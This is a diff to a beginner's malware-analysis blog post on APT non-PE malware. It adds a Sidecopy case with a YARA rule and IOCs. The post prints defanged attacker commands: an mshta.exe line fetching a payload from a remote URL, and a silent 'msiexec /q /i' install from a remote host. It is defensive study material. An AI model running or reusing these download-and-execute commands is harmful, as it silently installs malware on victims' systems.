@@ -12,7 +12,7 @@ categories: ["Non-PE Malware"]
     - Case 1 : Sidewinder using malicious document to drop RTF Payload.
     - Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.
     - Case 3 : Gamaredon using HTA to drop further malware.
-    - Case 4 : 
+    - Case 4 : Sidecopy using lnk to drop malicious msi file
 - YARA Rule.
     - Detecting Maldoc.
     - Detecting LNK.
@@ -39,6 +39,7 @@ Each group uses a different approach:
 - SideWinder delivers a malicious document (Maldoc).
 - Kimsuky uses a LNK file.
 - Gamaredon deploys an HTA file.
+- Sidecopy using a LNK file
 
 Now, I will analyze these files to understand their attack techniques.
 
@@ -127,11 +128,47 @@ Additionally, I discovered a **malicious script** embedded within the HTML file.
 
 Now, let's analyze this script further to understand its purpose and behavior.
 
-`CreateObject("WScript.Shell")[.]Run  "%windir%\system32\mshta[.]exe " &  "hxxps://louise-gzip-think-air.trycloudflare.com/OD/rotI7D/shortlyqXW.tif”`
+```jsx
+CreateObject("WScript.Shell")[.]Run  "%windir%\system32\mshta[.]exe " &  "hxxps://louise-gzip-think-air.trycloudflare.com/OD/rotI7D/shortlyqXW.tif”
+```
 
 This script basically accesses the **Windows Shell** and runs `mshta.exe`. The likely reason for using `mshta.exe` is to execute the script **without triggering any security warnings**.
 
 Additionally, the script contains a **remote URL** that appears to download a file with a `.tif` extension. However, I suspect that this is actually a **malicious payload** being fetched from a **C2 server** rather than a legitimate image file.
+
+### Case 4 : Sidecopy using lnk to drop malicious msi file
+
+I analyzed an **LNK file** and found that its **TargetIDList** contains the path:
+
+`MyComputer\C:\Windows\System32\cmd.exe` 
+
+This indicates that the LNK file is designed to open the Windows **Command Prompt**.
+
+Upon further examination of the **command-line arguments**, I found the following command:
+
+```jsx
+/c msiexec.exe /q /i hxxps://nhp.mowr.gov[.]in/NHPMIS/TrainingMaterial/aspx/Security-Guidelines/wont/
+```
+
+Breakdown of the command:
+
+- **`/c`** → Executes the command and then closes the Command Prompt.
+- **`msiexec.exe`** → A built-in Windows executable used to run **MSI (Microsoft Installer) files**.
+- **`/q` (Quiet Mode)** → Installs the MSI file **silently**, without any user interaction or pop-ups.
+- **The provided URL** → Hosts an **MSI file**, which is **fetched remotely** and executed.
+
+![vt](https://github.com/user-attachments/assets/c4c84b94-e502-4677-899e-993e791f0915)
+
+```sha256 : 541039d4eb67935884830657213991ba5da85f0650df6329c7153702a577a26a```
+
+```filename : installerr.msi```
+
+
+Potential Threat:
+
+- **Attackers often use remote MSI installations** to **deploy malware** without user awareness.
+- **Silent execution (`/q` flag)** ensures the installation happens discreetly, making detection more difficult.
+- **VirusTotal analysis confirmed that the MSI file is malicious**, indicating a potential **APT attack or malware deployment**.
 
 # YARA Rule
 I am learning YARA rules for the first time, so I have written this rule to detect three malicious files. It works by searching for basic strings within the file.
@@ -152,7 +189,7 @@ I am learning YARA rules for the first time, so I have written this rule to dete
             $url_name or $rtf_name
     }
     
-### Detecting LNK.
+### Detecting LNK Kimsuky
 
     rule detect_lnk
     {
@@ -189,6 +226,22 @@ I am learning YARA rules for the first time, so I have written this rule to dete
         $url_name and $payload or $ip_add or $login
     }
 
+### Detecting LNK for Sidecopy
+
+    rule detect_sidecopy
+    {
+        meta:
+            author = "Priya"
+            Description = "This rule is to detect malicious lnk file of Sidecopy "
+    
+        strings:
+            $cmd_args =                                                 /\/c\s*m\^s\^i\^e\^x\^e\^c\.exe\s*\/q\s*\/i\s*h\^t\^t\^p\^s\^:\^\/\^\/\^n\^h\^p\^\.\^m\^o\^w\^r\^\.\^g\^o\^v\^\.\^i\^n\^\/\^N\^H\^P\^M\^I\^S\^\/\^T\^r\^a\^i\^n\^i\^n\^g\^M\^a\^t\^e\^r\^i\^a\^l\^\/\^a\^s\^p\^x\^\/\^S\^e\^c\^u\^r\^i\^t\^y\^\-\^G\^u\^i\^d\^e\^l\^i\^n\^e\^s\^\/\^w\^o\^n\^t\^\//i
+    
+        condition:
+            $cmd_args
+            
+    }
+
 ### IOCs.
 
 ```268640934dd1f0cfe3a3653221858851a33cbf49a71adfb4d54a04641df11547```
@@ -196,6 +249,9 @@ I am learning YARA rules for the first time, so I have written this rule to dete
 ```47d77499968244911d0179fb858578de00dbb98079e33f5ed5d229d03eb04d67```
 
 ```95f5db1826819d8d61b85eec206ec6cba350ba3fd684941ae24fe363de1df2cb```
+
+```cc90bf946b495aec9133f6c970dc873977592277d003248361cfea1d0706c811```
+
 
 ### Limitations
 
